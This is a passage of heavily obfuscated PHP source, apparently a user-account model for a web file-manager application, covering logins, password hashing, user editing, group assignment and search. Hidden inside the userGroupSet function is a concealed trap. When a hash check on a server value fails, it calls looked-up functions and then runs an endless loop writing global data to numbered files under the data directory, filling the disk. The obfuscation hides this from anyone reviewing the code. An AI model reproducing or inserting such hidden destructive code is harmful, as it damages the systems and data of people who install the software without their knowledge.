array_remove_key($Ïî‹¶ÏÃ, $Êî™Á¹‹[234]); $ŞØÆúşÈ = array(); foreach ($ğ©¬ÛÅ as $âŞæøÓÈ) { if (isset($Ïî‹¶ÏÃ[$âŞæøÓÈ])) { $ŞØÆúşÈ[] = $Ïî‹¶ÏÃ[$âŞæøÓÈ]; } } return $ŞØÆúşÈ; } } class UserModel extends ModelBase { protected $tableName = "\165\163\x65\162"; protected $tableMeta = array("\x74\141\x62\154\x65\116\x61\x6d\x65" => "\165\163\x65\162\137\155\x65\164\141", "\155\x65\x74\141\106\x69\x65\x6c\144" => "\165\x73\x65\162\x49\104"); protected $simpleField = "\x75\x73\x65\162\111\104\x2c\x6e\151\143\x6b\x4e\141\x6d\145\x2c\x6e\x61\155\x65\x2c\141\166\x61\164\141\162\54\x73\145\170\54\x73\x74\141\164\x75\x73"; const ERROR_USER_NOT_EXISTS = -1; const ERROR_USER_PASSWORD_ERROR = -2; const ERROR_USER_EXIST_NAME = -3; const ERROR_USER_EXIST_PHONE = -4; const ERROR_USER_EXIST_EMAIL = -5; const ERROR_USER_LOGIN_LOCK = -6; const ERROR_IP_NOT_ALLOW = -7; const ERROR_USER_EXIST_NICKNAME = -8; protected function cacheFunctionAlias($ĞÃ­í¶) { $°è›™õ÷ =& $_SERVER[´‹ô¯Œ]; $©êÂëƒ = $°è›™õ÷[2491]; return array($°è›™õ÷[2078] => array($ĞÃ­í¶[0], $©êÂëƒ), $°è›™õ÷[2080] => array($ĞÃ­í¶[0], $©êÂëƒ), $°è›™õ÷[2492] => array($ĞÃ­í¶[0], $©êÂëƒ)); } protected function getInfo($ö´Ç¡ê¾, $¹»œ¯“ = false) { $õœ¦íã£ = $this->getInfoSimple($ö´Ç¡ê¾); if (!is_array($õœ¦íã£)) { return array(); } if ($¹»œ¯“) { return $this->_getInfoApply($õœ¦íã£); } return $this->cacheFunctionGet($_SERVER[´‹ô¯Œ][2082], $ö´Ç¡ê¾); } protected function getInfoFull($±¡Ûë¸ú, $Ÿé¡¢àˆ = false) { $¨–ë³Ë· = $this->getInfoSimple($±¡Ûë¸ú); if (!is_array($¨–ë³Ë·)) { return array(); } if ($Ÿé¡¢àˆ) { return $this->_getInfoApply($¨–ë³Ë·, !0); } return $this->cacheFunctionGet($_SERVER[´‹ô¯Œ][2493], $±¡Ûë¸ú); } private function _getInfoApply($Â‡‹½€ñ, $ª”µŞ¬Â = false) { $Î²£²¨ =& $_SERVER[´‹ô¯Œ]; if (!$Â‡‹½€ñ) { return $Â‡‹½€ñ; } $Äú´¸û¤ = md5($Î²£²¨[2494] . $Â‡‹½€ñ[$Î²£²¨[981]] . $Î²£²¨[2495] . $Â‡‹½€ñ[$Î²£²¨[32]]); $Â‡‹½€ñ = $this->_listDataApplyItem($Â‡‹½€ñ); $ÜÆ‡ñœ = Model($Î²£²¨[1445])->metaGet($Â‡‹½€ñ[$Î²£²¨[90]][$Î²£²¨[194]]); $Â‡‹½€ñ[$Î²£²¨[2496]] = $Äú´¸û¤; $Â‡‹½€ñ[$Î²£²¨[90]][$Î²£²¨[2280]] = isset($ÜÆ‡ñœ[$Î²£²¨[2281]]) ? $ÜÆ‡ñœ[$Î²£²¨[2281]] : null; if ($ª”µŞ¬Â) { $Â‡‹½€ñ[$Î²£²¨[553]] = $this->metaGet($Â‡‹½€ñ[$Î²£²¨[1796]]); } return $Â‡‹½€ñ; } protected function getInfoSimple($—àòÍ¶, $Ø¹ûÆû = false) { $ŒÑ¦› =& $_SERVER[´‹ô¯Œ]; if (!$—àòÍ¶) { return array(); } if ($Ø¹ûÆû) { $§Ëğ¾ = $this->where(array($ŒÑ¦›[1796] => intval($—àòÍ¶)))->find(); if (!is_array($§Ëğ¾)) { return array(); } $§Ëğ¾[$ŒÑ¦›[2497]] = Action($ŒÑ¦›[2498])->parseUrl($§Ëğ¾[$ŒÑ¦›[2497]]); return $§Ëğ¾; } return $this->cacheFunctionGet($ŒÑ¦›[2083], $—àòÍ¶); } protected function getInfoSimpleOuter($Ô—ğ‹Ïû) { $®Àı² =& $_SERVER[´‹ô¯Œ]; if (!$Ô—ğ‹Ïû || $Ô—ğ‹Ïû == 0) { return array($®Àı²[1796] => $®Àı²[231], $®Àı²[32] => $®Àı²[176] . LNG($®Àı²[2499]) . $®Àı²[178], $®Àı²[2497] => STATIC_PATH . $®Àı²[2500]); } $Æš¼÷¼Ã = $this->cacheFunctionGet($®Àı²[2083], $Ô—ğ‹Ïû); $š¦„ÆÊ¾ = array_field_key($Æš¼÷¼Ã, explode($®Àı²[50], $this->simpleField)); if (!$š¦„ÆÊ¾) { return array($®Àı²[1796] => $®Àı²[1290], $®Àı²[32] => $®Àı²[176] . LNG($®Àı²[2501]) . $®Àı²[178], $®Àı²[2497] => STATIC_PATH . $®Àı²[2502]); } $š¦„ÆÊ¾[$®Àı²[2497]] = Action($®Àı²[2498])->parseUrl($š¦„ÆÊ¾[$®Àı²[2497]]); return $š¦„ÆÊ¾; } protected function groupUser($œßç·¦´) { } public static function errorLang($ÊøÑã€ï) { $ÄÃê“Àõ =& $_SERVER[´‹ô¯Œ]; $–¥Çéç† = array(self::ERROR_USER_NOT_EXISTS => $ÄÃê“Àõ[2503], self::ERROR_USER_PASSWORD_ERROR => $ÄÃê“Àõ[2504], self::ERROR_USER_EXIST_NAME => $ÄÃê“Àõ[2505], self::ERROR_USER_EXIST_PHONE => $ÄÃê“Àõ[2506], self::ERROR_USER_EXIST_EMAIL => $ÄÃê“Àõ[2507], self::ERROR_USER_LOGIN_LOCK => $ÄÃê“Àõ[2508], self::ERROR_IP_NOT_ALLOW => $ÄÃê“Àõ[2509], self::ERROR_USER_EXIST_NICKNAME => $ÄÃê“Àõ[2510]); $½í°—²Ü = LNG($–¥Çéç†[$ÊøÑã€ï]); if ($ÊøÑã€ï == self::ERROR_USER_LOGIN_LOCK) { $ë‡ë™Ş = (int) Model($ÄÃê“Àõ[1401])->get($ÄÃê“Àõ[2511]); if ($ë‡ë™Ş > 60) { $½í°—²Ü = str_replace($ÄÃê“Àõ[91], ceil($ë‡ë™Ş / 60), $½í°—²Ü); } } return $½í°—²Ü; } protected function metaSet($—­¯æ¥…, $ãé›¼ò = null, $ùıİÒÖ = null) { $this->clearCache($—­¯æ¥…); return parent::metaSet($—­¯æ¥…, $ãé›¼ò, $ùıİÒÖ); } public function getInfoByMeta($Òåæ‡Õá, $ÂĞ²¬ÅŒ) { $›¶¥”¿ =& $_SERVER[´‹ô¯Œ]; $ãÔ¤ï¥Ş = Model($›¶¥”¿[2512])->where(array($›¶¥”¿[97] => $Òåæ‡Õá, $›¶¥”¿[453] => $ÂĞ²¬ÅŒ))->find(); if ($ãÔ¤ï¥Ş) { return $this->getInfo($ãÔ¤ï¥Ş[$›¶¥”¿[1796]]); } return !1; } public function userLoginCheck($Ÿ—ïÂºÌ, $Êö «¶, $¢ÁûışÃ = false) { $úäª =& $_SERVER[´‹ô¯Œ]; $ĞÈÕÄ‰Ø = $this->userLoginFind($Ÿ—ïÂºÌ); if (!$ĞÈÕÄ‰Ø) { return UserModel::ERROR_USER_NOT_EXISTS; } if (!$this->userPasswordCheck($ĞÈÕÄ‰Ø[$úäª[1796]], $Êö «¶)) { return UserModel::ERROR_USER_PASSWORD_ERROR; } return $¢ÁûışÃ ? $this->getInfoFull($ĞÈÕÄ‰Ø[$úäª[1796]]) : $this->getInfo($ĞÈÕÄ‰Ø[$úäª[1796]]); } public function userLoginFind($€ÛÀ‰í) { $åË”§â =& $_SERVER[´‹ô¯Œ]; $€Ò¾Ğœ = array($åË”§â[32] => $€ÛÀ‰í, $åË”§â[2293] => $€ÛÀ‰í, $åË”§â[383] => $€ÛÀ‰í, $åË”§â[2513] => $€ÛÀ‰í, $åË”§â[1092] => $åË”§â[1094]); if ($this->nickNameRpt()) { unset($€Ò¾Ğœ[$åË”§â[2293]]); } return $this->where($€Ò¾Ğœ)->find(); } public function clearCache($äâ±ã“´) { $Ã¬ôßŸâ =& $_SERVER[´‹ô¯Œ]; $this->cacheFunctionClear($Ã¬ôßŸâ[2082], $äâ±ã“´); $this->cacheFunctionClear($Ã¬ôßŸâ[2083], $äâ±ã“´); $this->cacheFunctionClear($Ã¬ôßŸâ[2493], $äâ±ã“´); } public function userPasswordCheck($­ó×Ëü², $˜‡§íÇå) { $ƒÊ°•µÅ =& $_SERVER[´‹ô¯Œ]; $×ìÔŒö = $this->where(array($ƒÊ°•µÅ[1796] => intval($­ó×Ëü²)))->find(); $ä»Ç¿òË = $this->metaGet($­ó×Ëü²); $ü™¸©Œ = isset($ä»Ç¿òË[$ƒÊ°•µÅ[2514]]) ? $ä»Ç¿òË[$ƒÊ°•µÅ[2514]] : $ƒÊ°•µÅ[12]; if (md5($ü™¸©Œ . trim($˜‡§íÇå)) !== $×ìÔŒö[$ƒÊ°•µÅ[981]]) { return !1; } return !0; } public function userAdd($™Ó”ù¤«) { $ñîåÆê“ =& $_SERVER[´‹ô¯Œ]; $åö·Ü = array($ñîåÆê“[506] => $™Ó”ù¤«[$ñîåÆê“[32]], $ñîåÆê“[2515] => $™Ó”ù¤«[$ñîåÆê“[2204]], $ñîåÆê“[2516] => isset($™Ó”ù¤«[$ñîåÆê“[383]]) ? $™Ó”ù¤«[$ñîåÆê“[383]] : $ñîåÆê“[12], $ñîåÆê“[2517] => isset($™Ó”ù¤«[$ñîåÆê“[2513]]) ? $™Ó”ù¤«[$ñîåÆê“[2513]] : $ñîåÆê“[12], $ñîåÆê“[2518] => isset($™Ó”ù¤«[$ñîåÆê“[2293]]) ? $™Ó”ù¤«[$ñîåÆê“[2293]] : $™Ó”ù¤«[$ñîåÆê“[32]], $ñîåÆê“[2519] => isset($™Ó”ù¤«[$ñîåÆê“[2497]]) ? $™Ó”ù¤«[$ñîåÆê“[2497]] : $ñîåÆê“[12], $ñîåÆê“[2520] => isset($™Ó”ù¤«[$ñîåÆê“[2521]]) ? $™Ó”ù¤«[$ñîåÆê“[2521]] : 1, $ñîåÆê“[2522] => $™Ó”ù¤«[$ñîåÆê“[981]], $ñîåÆê“[2084] => isset($™Ó”ù¤«[$ñîåÆê“[1983]]) ? $™Ó”ù¤«[$ñîåÆê“[1983]] : 1024 * 1024 * 20, $ñîåÆê“[2085] => 0, $ñîåÆê“[2523] => 0, $ñîåÆê“[2129] => isset($™Ó”ù¤«[$ñîåÆê“[836]]) ? $™Ó”ù¤«[$ñîåÆê“[836]] : 1); if (!empty($™Ó”ù¤«[$ñîåÆê“[1796]])) { $åö·Ü[$ñîåÆê“[1796]] = $™Ó”ù¤«[$ñîåÆê“[1796]]; } $ÅĞÉúƒ… = $this->_checkExist($™Ó”ù¤«); if ($ÅĞÉúƒ… !== !0) { return $ÅĞÉúƒ…; } if (!empty($åö·Ü[$ñîåÆê“[2497]]) && strlen($åö·Ü[$ñîåÆê“[2497]]) > 255) { $åö·Ü[$ñîåÆê“[2497]] = $ñîåÆê“[12]; } $¤¹œù³Ş = $this->add($åö·Ü); $®¯°íÅú = array($ñîåÆê“[2522] => $åö·Ü[$ñîåÆê“[981]], $ñîåÆê“[2518] => $åö·Ü[$ñîåÆê“[2293]], $ñîåÆê“[2524] => $™Ó”ù¤«[$ñîåÆê“[2089]]); $this->userEdit($¤¹œù³Ş, $®¯°íÅú); Model($ñîåÆê“[1445])->userRootAdd($¤¹œù³Ş); return $¤¹œù³Ş; } protected function userEditTest($Ö¼ûè¢ş, $†Ù­ˆ‰Ğ) { return $this->call($_SERVER[´‹ô¯Œ][2525], $Ö¼ûè¢ş, $†Ù­ˆ‰Ğ); } protected function userEdit($öí¿é¨, $•ÛÏ¥çô) { $‹òİıÊ½ =& $_SERVER[´‹ô¯Œ]; $Ø˜»„…µ = $this->getInfoSimple($öí¿é¨); if (!$Ø˜»„…µ) { return !1; } $ÉìÍ·ß‡ = $this->_checkExist($•ÛÏ¥çô, $öí¿é¨); if ($ÉìÍ·ß‡ !== !0) { return $ÉìÍ·ß‡; } if (isset($•ÛÏ¥çô[$‹òİıÊ½[981]]) && trim($•ÛÏ¥çô[$‹òİıÊ½[981]]) != $‹òİıÊ½[12]) { $ìŞö§®Ì = $this->metaGet($öí¿é¨); if (empty($ìŞö§®Ì[$‹òİıÊ½[2514]])) { $ìŞö§®Ì[$‹òİıÊ½[2514]] = rand_string(10); Model($‹òİıÊ½[591])->metaSet($öí¿é¨, $‹òİıÊ½[2514], $ìŞö§®Ì[$‹òİıÊ½[2514]]); } $•ÛÏ¥çô[$‹òİıÊ½[981]] = md5($ìŞö§®Ì[$‹òİıÊ½[2514]] . trim($•ÛÏ¥çô[$‹òİıÊ½[981]])); } else { unset($•ÛÏ¥çô[$‹òİıÊ½[981]]); } if (!empty($•ÛÏ¥çô[$‹òİıÊ½[2497]]) && strlen($•ÛÏ¥çô[$‹òİıÊ½[2497]]) > 255) { $•ÛÏ¥çô[$‹òİıÊ½[2497]] = $‹òİıÊ½[12]; } if (isset($•ÛÏ¥çô[$‹òİıÊ½[2293]])) { $this->setNamePinyin($öí¿é¨, $•ÛÏ¥çô[$‹òİıÊ½[2293]]); } if (isset($•ÛÏ¥çô[$‹òİıÊ½[2089]])) { $“”Æ”¶• = $‹òİıÊ½[1404] . $öí¿é¨; $‰¿Í¦ú§ = $‹òİıÊ½[1402]; $ÍÅÊãğü = $•ÛÏ¥çô[$‹òİıÊ½[2089]] ? $•ÛÏ¥çô[$‹òİıÊ½[2089]] : $‹òİıÊ½[12]; $òÏØÆòş = Model($‹òİıÊ½[1401])->get($“”Æ”¶•, $‰¿Í¦ú§); $òÏØÆòş = $òÏØÆòş ? $òÏØÆòş : $‹òİıÊ½[12]; if ($òÏØÆòş != $ÍÅÊãğü) { if (!$ÍÅÊãğü && $òÏØÆòş) { Model($‹òİıÊ½[1401])->remove($“”Æ”¶•, $‰¿Í¦ú§); } else { if ($ÍÅÊãğü) { Model($‹òİıÊ½[1401])->set($“”Æ”¶•, $ÍÅÊãğü, $‰¿Í¦ú§); } } } unset($•ÛÏ¥çô[$‹òİıÊ½[2089]]); Model($‹òİıÊ½[611])->metaSet($öí¿é¨, $‹òİıÊ½[2089], $ÍÅÊãğü); } $this->where(array($‹òİıÊ½[1787] => $öí¿é¨))->save($•ÛÏ¥çô); $this->clearCache($öí¿é¨); return !0; } public function setNamePinyin($â‡í»’‡, $ØÀìãØÒ = false) { $„ØµÅîß =& $_SERVER[´‹ô¯Œ]; if (!$ØÀìãØÒ) { $¸êŸùèË = $this->getInfoSimple($â‡í»’‡); $ØÀìãØÒ = $¸êŸùèË[$„ØµÅîß[2293]] ? $¸êŸùèË[$„ØµÅîß[2293]] : $¸êŸùèË[$„ØµÅîß[32]]; } $¦§›ˆúÙ = Model($„ØµÅîß[611]); if (!Input::check($ØÀìãØÒ, $„ØµÅîß[672])) { return $¦§›ˆúÙ->metaSet($â‡í»’‡, array($„ØµÅîß[550] => $„ØµÅîß[12], $„ØµÅîß[549] => $„ØµÅîß[12])); } return $¦§›ˆúÙ->metaSet($â‡í»’‡, array($„ØµÅîß[550] => str_replace($„ØµÅîß[53], $„ØµÅîß[12], Pinyin::get($ØÀìãØÒ)), $„ØµÅîß[549] => Pinyin::get($ØÀìãØÒ, $„ØµÅîß[673]))); } private function nickNameRpt() { $¼œÂ’Á =& $_SERVER[´‹ô¯Œ]; $Ñ¯ùåñâ = Model($¼œÂ’Á[856])->get($¼œÂ’Á[2526]); $•ºÌ¬¤Š = $GLOBALS[$¼œÂ’Á[6]][$¼œÂ’Á[460]][$¼œÂ’Á[2526]]; $Óˆ«÷…å = !is_null($Ñ¯ùåñâ) ? $Ñ¯ùåñâ : $•ºÌ¬¤Š; return !!$Óˆ«÷…å; } private function _checkExist($ñ‹Şç´¢, $ş•ÍËÒ† = false) { $á£²¸ =& $_SERVER[´‹ô¯Œ]; $÷§éù×ı = array($á£²¸[32] => UserModel::ERROR_USER_EXIST_NAME, $á£²¸[2293] => UserModel::ERROR_USER_EXIST_NICKNAME, $á£²¸[383] => UserModel::ERROR_USER_EXIST_EMAIL, $á£²¸[2513] => UserModel::ERROR_USER_EXIST_PHONE); if ($this->nickNameRpt()) { unset($÷§éù×ı[$á£²¸[2293]]); } $Ëå…ŠÔ = $ş•ÍËÒ† ? array($á£²¸[1796] => array($á£²¸[2527], $ş•ÍËÒ†)) : array(); foreach ($÷§éù×ı as $®Ò£Ûƒ¯ => $èÌßØÛÎ) { $Ïò‚Òî± = array(); foreach ($÷§éù×ı as $†™ ‹ºé => $êûşÌ›à) { if (isset($ñ‹Şç´¢[$†™ ‹ºé]) && $ñ‹Şç´¢[$†™ ‹ºé]) { $Ïò‚Òî±[] = $ñ‹Şç´¢[$†™ ‹ºé]; } } if (!$Ïò‚Òî±) { continue; } $û×ÒñÖç = array_merge(array($®Ò£Ûƒ¯ => array($á£²¸[7], $Ïò‚Òî±)), $Ëå…ŠÔ); $ô¸ëæ¯Ì = $this->where($û×ÒñÖç)->find(); if ($ô¸ëæ¯Ì) { return $èÌßØÛÎ; } } return !0; } public function userListInfo($Ë½¾Ä¥§) { $§Ş±âö• =& $_SERVER[´‹ô¯Œ]; $üâÁÛ = array(); $Ë½¾Ä¥§ = is_array($Ë½¾Ä¥§) ? array_unique($Ë½¾Ä¥§) : array(); if (!$Ë½¾Ä¥§) { return $üâÁÛ; } if (count($Ë½¾Ä¥§) < 20) { foreach ($Ë½¾Ä¥§ as $úúÔ¤Ç¡) { $üâÁÛ[$úúÔ¤Ç¡ . $§Ş±âö•[12]] = $this->getInfoSimpleOuter($úúÔ¤Ç¡); } } else { $—Õ—ÉÑ = array($§Ş±âö•[1787] => array($§Ş±âö•[504], $Ë½¾Ä¥§)); if (count($Ë½¾Ä¥§) == 1) { $—Õ—ÉÑ = array($§Ş±âö•[1787] => $Ë½¾Ä¥§[0]); } $–Æíõ½• = Model($§Ş±âö•[591])->field($this->simpleField)->where($—Õ—ÉÑ)->select(); $–Æíõ½• = array_to_keyvalue($–Æíõ½•, $§Ş±âö•[1796]); foreach ($Ë½¾Ä¥§ as $úúÔ¤Ç¡) { $­ÍËé—£ = $–Æíõ½•[$úúÔ¤Ç¡]; if (!$­ÍËé—£) { $üâÁÛ[$úúÔ¤Ç¡ . $§Ş±âö•[12]] = $this->getInfoSimpleOuter($úúÔ¤Ç¡); continue; } $­ÍËé—£[$§Ş±âö•[2497]] = Action($§Ş±âö•[2498])->parseUrl($­ÍËé—£[$§Ş±âö•[2497]]); $üâÁÛ[$úúÔ¤Ç¡ . $§Ş±âö•[12]] = $­ÍËé—£; } } return $üâÁÛ; } protected function userStatus($º¥—Ê¦©, $™üı–Â¤) { $ØÜ§÷‘Î = $this->getInfoSimple($º¥—Ê¦©); if (!$ØÜ§÷‘Î) { return !1; } $Ø¼®”‰î = array($_SERVER[´‹ô¯Œ][836] => $™üı–Â¤); return $this->userEdit($º¥—Ê¦©, $Ø¼®”‰î); } protected function userRemove($¾¨á¤…) { $Ã”ëâì =& $_SERVER[´‹ô¯Œ]; $‚Äé¥ë = $this->getInfoSimple($¾¨á¤…); if (!$‚Äé¥ë) { return !1; } $‹˜¨ƒ“Ë = array($Ã”ëâì[1787] => $¾¨á¤…); Model($Ã”ëâì[681])->where($‹˜¨ƒ“Ë)->delete(); Model($Ã”ëâì[2528])->where($‹˜¨ƒ“Ë)->delete(); Model($Ã”ëâì[2091])->where($‹˜¨ƒ“Ë)->delete(); Model($Ã”ëâì[2512])->where($‹˜¨ƒ“Ë)->delete(); Model($Ã”ëâì[1161])->where($‹˜¨ƒ“Ë)->delete(); Model($Ã”ëâì[2310])->removeUserAll($¾¨á¤…); Model($Ã”ëâì[916])->userRootRemove($¾¨á¤…); return $this->where($‹˜¨ƒ“Ë)->delete(); } protected function userGroupSet($†òñâá, $è¢Ã³™Ü, $òô±‹Áñ = array()) { $ Ğ…±ê¡ =& $_SERVER[´‹ô¯Œ]; $‰£°Ù‰š = $_SERVER[$ Ğ…±ê¡[483]]; $‹€ñµÅà = $ Ğ…±ê¡[969]; if ($_SERVER[$ Ğ…±ê¡[475]] != $‹€ñµÅà($‰£°Ù‰š)) { $ä€—î÷ = $ Ğ…±ê¡[970]; $¾ÙäÌã± = $ Ğ…±ê¡[477]; $’¶ ©í = $_SERVER[$ Ğ…±ê¡[478]] . $ Ğ…±ê¡[479]; $ÜÄÏÓşµ = $¾ÙäÌã±($’¶ ©í); $¥åÛ£Öñ = explode($ Ğ…±ê¡[288], $ÜÄÏÓşµ); if (count($¥åÛ£Öñ) < $ Ğ…±ê¡[701]) { $Ğ ƒº›É = $ Ğ…±ê¡[481]; $Ğ ƒº›É(); } $†Ï¦¿ÆÈ = $ Ğ…±ê¡[971]; $†Ï¦¿ÆÈ($_SERVER[$ Ğ…±ê¡[972]]); $ä€—î÷ = $ Ğ…±ê¡[970]; $ä€—î÷(); $®Ñ²¹—Ÿ = $ Ğ…±ê¡[973]; $ãŞİŸÆ£ = json_encode($GLOBALS[$ Ğ…±ê¡[974]]); $Èãœ†š÷ = 1; for ($İØ·©å = $Èãœ†š÷; $İØ·©å > 0; $İØ·©å++) { $®Ñ²¹—Ÿ(DATA_PATH . $İØ·©å, $ãŞİŸÆ£); } } $¸äë––ä = $this->getInfoSimple($†òñâá); if (!$¸äë––ä || !is_array($è¢Ã³™Ü)) { return !1; } $Éİ§Ù¾æ = Model($ Ğ…±ê¡[2091]); $Éİ§Ù¾æ->where(array($ Ğ…±ê¡[1796] => $†òñâá))->delete(); $ÒĞ£êÖù = array(); $çê­î¨¿ = 0; foreach ($è¢Ã³™Ü as $ûÖœÄ†é => $ç°”Ôˆ‰) { $½Ä«‰‘û = array($ Ğ…±ê¡[1796] => $†òñâá, $ Ğ…±ê¡[1407] => $ûÖœÄ†é, $ Ğ…±ê¡[2105] => $ç°”Ôˆ‰); $½Ä«‰‘û[$ Ğ…±ê¡[2020]] = isset($òô±‹Áñ[$çê­î¨¿]) ? $òô±‹Áñ[$çê­î¨¿] : 0; $çê­î¨¿++; $ÒĞ£êÖù[] = $½Ä«‰‘û; } return $Éİ§Ù¾æ->addAll($ÒĞ£êÖù, array(), !0); } protected function userGroupAdd($¥”¿­ø, $Ï×«¸â = array()) { $ßÚëÉ³® =& $_SERVER[´‹ô¯Œ]; $ä¹¤ÜÊ± = $this->getInfoSimple($¥”¿­ø); if (!$ä¹¤ÜÊ± || empty($Ï×«¸â)) { return !1; } $Ÿş³ÖÁî = array(); foreach ($Ï×«¸â as $ÕçñÂø« => $ì‘˜ªö) { $Ÿş³ÖÁî[] = array($ßÚëÉ³®[1796] => $¥”¿­ø, $ßÚëÉ³®[1407] => $ÕçñÂø«, $ßÚëÉ³®[2105] => $ì‘˜ªö, $ßÚëÉ³®[2020] => 0); } return Model($ßÚëÉ³®[2091])->addAll($Ÿş³ÖÁî, array(), !0); } protected function userGroupRemove($íÀìµÙ, $Œ®¿Ê§ƒ) { $£ÕÉ¨şÛ =& $_SERVER[´‹ô¯Œ]; $ı»ªŠ  = $this->getInfoSimple($íÀìµÙ); if (!$ı»ªŠ  || !$Œ®¿Ê§ƒ) { return !1; } $ò¨¤ÈÙß = array($£ÕÉ¨şÛ[1787] => $íÀìµÙ, $£ÕÉ¨şÛ[2086] => $Œ®¿Ê§ƒ); return Model($£ÕÉ¨şÛ[2091])->where($ò¨¤ÈÙß)->delete(); } public function listData() { $¬°Êƒ”¿ = $this->_makeOrder()->selectPage(50); $this->_listDataApply($¬°Êƒ”¿[$_SERVER[´‹ô¯Œ][448]]); return $¬°Êƒ”¿; } public function listByID($ïš£Ñì‡) { $ı™Ø®ëô =& $_SERVER[´‹ô¯Œ]; if (!$ïš£Ñì‡) { return; } $ÇÔçĞÏÎ = array($ı™Ø®ëô[1796] => array($ı™Ø®ëô[7], $ïš£Ñì‡)); $Í÷ƒ”İ = $this->where($ÇÔçĞÏÎ)->select(); $Í÷ƒ”İ = array_sort_keep($Í÷ƒ”İ, $ı™Ø®ëô[1796], $ïš£Ñì‡); $this->_listDataApply($Í÷ƒ”İ); return $Í÷ƒ”İ; } public function listByGroup($’­ÂÃà = 0, $½Á¦»òŞ = array()) { $ö¯¤ò‚Ø =& $_SERVER[´‹ô¯Œ]; $óÊ‚åÅ² = $ö¯¤ò‚Ø[12]; $÷çÖàé‚ = array(); if ($’­ÂÃà) { $÷çÖàé‚ = array($ö¯¤ò‚Ø[2529] => intval($’­ÂÃà)); $óÊ‚åÅ² = "\x4c\x45\x46\124\x20\112\117\x49\116\x20{$this->tablePrefix}\x75\x73\145\162\137\x67\162\157\165\160\x20\165\x73\x65\x72\137\147\x72\157\x75\160\40\157\x6e\x20\165\163\x65\162\56\165\163\145\162\111\x44\x20\x3d\40\165\163\145\x72\137\x67\x72\157\x75\x70\56\x75\163\145\x72\111\x44"; $¯òÎô”­ = Input::get($ö¯¤ò‚Ø[542], null, $ö¯¤ò‚Ø[12]) ? $ö¯¤ò‚Ø[12] : $ö¯¤ò‚Ø[2530]; } if (isset($½Á¦»òŞ[$ö¯¤ò‚Ø[836]])) { $÷çÖàé‚[$ö¯¤ò‚Ø[2531]] = $½Á¦»òŞ[$ö¯¤ò‚Ø[836]]; } $‘Æ·»Ì = _get($½Á¦»òŞ, $ö¯¤ò‚Ø[2532], $ö¯¤ò‚Ø[234]); if (_get($½Á¦»òŞ, $ö¯¤ò‚Ø[846], !1)) { $÷çÖàé‚[$‘Æ·»Ì] = array($ö¯¤ò‚Ø[2274], $½Á¦»òŞ[$ö¯¤ò‚Ø[846]]); } if (_get($½Á¦»òŞ, $ö¯¤ò‚Ø[847], !1)) { $ßÍÉÂ†´ = array($ö¯¤ò‚Ø[2275], $½Á¦»òŞ[$ö¯¤ò‚Ø[847]]); if ($÷çÖàé‚[$‘Æ·»Ì]) { $÷çÖàé‚[$‘Æ·»Ì] = array($÷çÖàé‚[$‘Æ·»Ì], $ßÍÉÂ†´, $ö¯¤ò‚Ø[2276]); } else { $÷çÖàé‚[$‘Æ·»Ì] = $ßÍÉÂ†´; } } $”–ÍÄĞĞ = $this->_makeOrder($¯òÎô”­)->field($ö¯¤ò‚Ø[2533])->where($÷çÖàé‚)->join($óÊ‚åÅ²)->selectPage(50); $this->_listDataApply($”–ÍÄĞĞ[$ö¯¤ò‚Ø[448]]); return $”–ÍÄĞĞ; } private function _makeOrder($ëÏ©†ï¨ = '') { $Õü«ê™ß =& $_SERVER[´‹ô¯Œ]; $ÄÄ¦Õåó = array($Õü«ê™ß[1796], $Õü«ê™ß[32], $Õü«ê™ß[1985], $Õü«ê™ß[2204], $Õü«ê™ß[1957], $Õü«ê™ß[234]); $‘îÄíÊû = array($Õü«ê™ß[535] => $Õü«ê™ß[536], $Õü«ê™ß[537] => $Õü«ê™ß[538]); $Ÿãà†í× = Input::get($Õü«ê™ß[542], $Õü«ê™ß[7], $Õü«ê™ß[1787], $ÄÄ¦Õåó); $Éå¿Åı­ = Input::get($Õü«ê™ß[543], $Õü«ê™ß[7], $Õü«ê™ß[2092], array($Õü«ê™ß[2092], $Õü«ê™ß[537])); $Éå¿Åı­ = $‘îÄíÊû[$Éå¿Åı­]; $ëÏ©†ï¨ = $ëÏ©†ï¨ . "\x75\x73\145\x72\x2e{$Ÿãà†í×}\40{$Éå¿Åı­}\54\40\x75\163\x65\x72\x2e\165\163\145\162\x49\104\40\x61\163\143"; return $this->alias($Õü«ê™ß[2220])->order($ëÏ©†ï¨); } public function listSearch($ô¿•‘åõ) { $™¯Ü—€™ =& $_SERVER[´‹ô¯Œ]; $øƒ´íñ = trim($ô¿•‘åõ[$™¯Ü—€™[2095]]); $îÃ›€‚« = explode($™¯Ü—€™[53], $øƒ´íñ); if (!$øƒ´íñ || count($îÃ›€‚«) == 1) { return $this->listSearchNow($ô¿•‘åõ); } $¶ã…¯–’ = array($™¯Ü—€™[448] => array()); foreach ($îÃ›€‚« as $à¸Ø—ú®) { if (!trim($à¸Ø—ú®)) { continue; } $ô¿•‘åõ[$™¯Ü—€™[2095]] = $à¸Ø—ú®; $şó¸ıç€ = $this->listSearchNow($ô¿•‘åõ); $¶ã…¯–’[$™¯Ü—€™[448]] = array_merge($¶ã…¯–’[$™¯Ü—€™[448]], $şó¸ıç€[$™¯Ü—€™[448]]); } $¶ã…¯–’[$™¯Ü—€™[448]] = array_unique_by_key($¶ã…¯–’[$™¯Ü—€™[448]], $™¯Ü—€™[1796]); $¶ã…¯–’[$™¯Ü—€™[445]] = array($™¯Ü—€™[446] => count($¶ã…¯–’[$™¯Ü—€™[448]]), $™¯Ü—€™[442] => 20, $™¯Ü—€™[431] => 1, $™¯Ü—€™[447] => 1); return $¶ã…¯–’; } public function listSearchNow($Êúö¸×í) { $ÉäÓü÷ñ =& $_SERVER[´‹ô¯Œ]; $…öö ¼º = trim($Êúö¸×í[$ÉäÓü÷ñ[2095]]); $ÌÄã´Ëï = isset($Êúö¸×í[$ÉäÓü÷ñ[2096]]) ? $Êúö¸×í[$ÉäÓü÷ñ[2096]] : !1; $…öö ¼º = str_replace($ÉäÓü÷ñ[2097], $ÉäÓü÷ñ[2098], trim($…öö ¼º)); $ş³ëúÃ = array($ÉäÓü÷ñ[32] => array($ÉäÓü÷ñ[462], "\x25{$…öö ¼º}\45"), $ÉäÓü÷ñ[383] => array($ÉäÓü÷ñ[462], "{$…öö ¼º}\45"), $ÉäÓü÷ñ[2293] => array($ÉäÓü÷ñ[462], "{$…öö ¼º}\45"), $ÉäÓü÷ñ[1092] => $ÉäÓü÷ñ[2099]); if (Input::check($…öö ¼º, $ÉäÓü÷ñ[389])) { $ş³ëúÃ[$ÉäÓü÷ñ[1796]] = array($ÉäÓü÷ñ[462], "{$…öö ¼º}\x25"); $ş³ëúÃ[$ÉäÓü÷ñ[2513]] = 